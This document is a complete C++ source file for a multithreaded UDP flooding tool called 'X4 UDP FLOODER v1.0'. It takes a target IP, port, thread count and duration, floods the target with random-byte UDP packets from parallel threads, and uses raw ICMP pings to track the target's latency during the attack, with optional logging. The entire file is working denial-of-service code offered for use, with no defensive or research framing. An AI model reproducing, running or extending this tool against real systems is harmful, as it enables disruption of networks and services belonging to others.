#include <iostream>
#include <thread>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <ctime>
#include <atomic>
#include <chrono>
#include <sstream>
#include <fstream>
#include <csignal>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <sys/socket.h>

int PACKET_SIZE = 1024;
std::atomic<uint64_t> bytes_sent(0);
std::ofstream log_file;
bool logging_enabled = false;
volatile std::atomic<bool> stop(false);
std::atomic<bool> interrupted(false);
std::chrono::steady_clock::time_point start_time;
int global_duration = 0;

void press_to_exit() {
    std::cout << "\n\u23CE Press ENTER to exit...";
    std::cin.get();
}

void print_usage(const char* prog) {
    std::cout << "\033[1;36m";
    std::cout << "\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n";
    std::cout << "\u2551           \U0001F525 X4 UDP FLOODER v1.0 \U0001F525          \u2551\n";
    std::cout << "\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\n";
    std::cout << "\u2551 Usage: \033[1;33m" << prog << " <IP> <PORT> <THREADS> <DURATION> [--packet-size=SIZE] [--log]\033[1;36m\n";
    std::cout << "\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\033[0m\n";
}

std::string current_time_str() {
    time_t now = time(nullptr);
    char buffer[64];
    strftime(buffer, sizeof(buffer), "%Y%m%d_%H%M%S", localtime(&now));
    return std::string(buffer);
}

uint16_t checksum(uint16_t* buffer, int size) {
    long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1)
        sum += *(uint8_t*)buffer;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)~sum;
}

int native_ping(const std::string& ip) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) return -1;

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    char send_buf[64];
    memset(send_buf, 0, sizeof(send_buf));
    icmp* icmp_hdr = (icmp*)send_buf;
    icmp_hdr->icmp_type = ICMP_ECHO;
    icmp_hdr->icmp_code = 0;
    icmp_hdr->icmp_id = getpid();
    icmp_hdr->icmp_seq = 1;
    icmp_hdr->icmp_cksum = checksum((uint16_t*)icmp_hdr, sizeof(send_buf));

    timeval start{}, end{};
    gettimeofday(&start, nullptr);

    sendto(sockfd, send_buf, sizeof(send_buf), 0, (sockaddr*)&addr, sizeof(addr));

    fd_set read_fds;
    FD_ZERO(&read_fds);
    FD_SET(sockfd, &read_fds);
    timeval timeout = {1, 0};
    if (select(sockfd + 1, &read_fds, nullptr, nullptr, &timeout) > 0) {
        char recv_buf[128];
        socklen_t len = sizeof(addr);
        recvfrom(sockfd, recv_buf, sizeof(recv_buf), 0, (sockaddr*)&addr, &len);
        gettimeofday(&end, nullptr);
        close(sockfd);
        return static_cast<int>((end.tv_sec - start.tv_sec) * 1000 + (end.tv_usec - start.tv_usec) / 1000);
    }

    close(sockfd);
    return -1;
}

void udp_flood(const std::string& ip, int port, int duration) {
    int sockfd;
    sockaddr_in target_addr{};
    char* buffer = new char[PACKET_SIZE];
    for (int i = 0; i < PACKET_SIZE; ++i) buffer[i] = rand() % 256;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) { perror("UDP socket failed"); delete[] buffer; return; }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &target_addr.sin_addr);

    time_t end = time(nullptr) + duration;
    while (!stop && time(nullptr) < end) {
        ssize_t sent = sendto(sockfd, buffer, PACKET_SIZE, 0, (sockaddr*)&target_addr, sizeof(target_addr));
        if (sent > 0) bytes_sent += sent;
    }

    close(sockfd);
    delete[] buffer;
}

void show_stats(int duration, const std::string& ip, int port) {
    using namespace std::chrono;
    uint64_t last_bytes = 0, total_bytes = 0;

    for (int i = 0; i < duration; ++i) {
        sleep(1);
        if (stop) break;

        uint64_t current = bytes_sent.load();
        uint64_t delta = current - last_bytes;
        last_bytes = current;
        total_bytes = current;

        double mbps = (delta * 8) / 1'000'000.0;
        double avg_mbps = (total_bytes * 8.0) / ((i + 1) * 1'000'000.0);
        int ping = native_ping(ip);

        auto elapsed = duration_cast<seconds>(steady_clock::now() - start_time).count();
        int time_remaining = global_duration - static_cast<int>(elapsed);

        std::ostringstream stats;
        stats << "\r\033[1;34m\u23F1 " << elapsed << "s | \U0001F4CA Speed: " << mbps << " Mbps"
              << " | Avg: " << avg_mbps << " Mbps"
              << " | Total: " << (total_bytes / 1024 / 1024) << " MB"
              << " | Ping: " << (ping == -1 ? "❌ Timeout" : std::to_string(ping) + "ms")
              << " | Time Left: " << (time_remaining > 0 ? std::to_string(time_remaining) + "s" : "0s")
              << "     \033[0m";

        std::cout << stats.str() << std::flush;

        if (logging_enabled) {
            log_file << "[T+" << elapsed << "s] "
                     << "Speed: " << mbps << " Mbps | Avg: " << avg_mbps << " Mbps | "
                     << "Total Sent: " << (total_bytes / 1024 / 1024) << " MB | "
                     << "Ping: " << (ping == -1 ? "Timeout" : std::to_string(ping) + "ms") << " | "
                     << "Time Remaining: " << (time_remaining > 0 ? std::to_string(time_remaining) + "s" : "0s")
                     << "\n";
        }
    }
}

void handle_interrupt(int) {
    if (!stop.exchange(true)) {
        interrupted = true;
        std::cout << "\n\033[1;31m⛔ Interrupted by user. Cleaning up...\033[0m\n";
    }
}

int main(int argc, char* argv[]) {
    signal(SIGINT, handle_interrupt);

    if (argc < 5) {
        print_usage(argv[0]);
        press_to_exit();
        return 1;
    }

    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    int threads = std::stoi(argv[3]);
    int duration = std::stoi(argv[4]);
    global_duration = duration;

    for (int i = 5; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg.rfind("--packet-size=", 0) == 0)
            PACKET_SIZE = std::stoi(arg.substr(14));
        else if (arg == "--log")
            logging_enabled = true;
        else {
            std::cerr << "❌ Unknown argument: " << arg << "\n";
            print_usage(argv[0]);
            press_to_exit();
            return 1;
        }
    }

    std::cout << "\n\U0001F3AF Target: " << ip << ":" << port;
    int ping = native_ping(ip);
    std::cout << " | Ping: " << (ping == -1 ? "❌ Timeout" : std::to_string(ping) + "ms") << "\n";

    if (logging_enabled) {
        std::string filename = "x4-" + current_time_str() + ".log";
        log_file.open(filename);
        if (!log_file) {
            std::cerr << "❌ Could not open log file.\n";
            press_to_exit();
            return 1;
        }
        log_file << "\n\U0001F4DD DETAILED LOG START\nTarget: " << ip << ":" << port << "\nDuration: " << duration << " seconds\nPacket Size: " << PACKET_SIZE << " bytes\nThreads: " << threads << "\n---\n";
    }

    start_time = std::chrono::steady_clock::now();
    srand(time(nullptr));
    std::vector<std::thread> workers;
    for (int i = 0; i < threads; ++i)
        workers.emplace_back(udp_flood, ip, port, duration);

    std::thread stats(show_stats, duration, ip, port);

    for (auto& t : workers) t.join();
    stats.join();

    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                       std::chrono::steady_clock::now() - start_time)
                       .count();
    if (elapsed == 0) elapsed = 1;

    uint64_t total = bytes_sent.load();
    double avg = (total * 8.0) / (elapsed * 1'000'000.0);

    std::cout << "\n\033[1;32m✅ Flood complete.\033[0m Sent " << (total / 1024 / 1024)
              << " MB | Avg Speed: " << avg << " Mbps | Elapsed: " << elapsed << "s\n";

    if (logging_enabled) {
        log_file << "---\n\u2705 FLOOD COMPLETE\n"
                 << "Elapsed Time: " << elapsed << " seconds\n"
                 << "Total Sent: " << (total / 1024 / 1024) << " MB\n"
                 << "Average Speed: " << avg << " Mbps\n"
                 << "\U0001F4C1 Log End\n";
        log_file.close();
        std::cout << "\U0001F4C1 Log saved.\n";
    }

    press_to_exit();
    return 0;
}
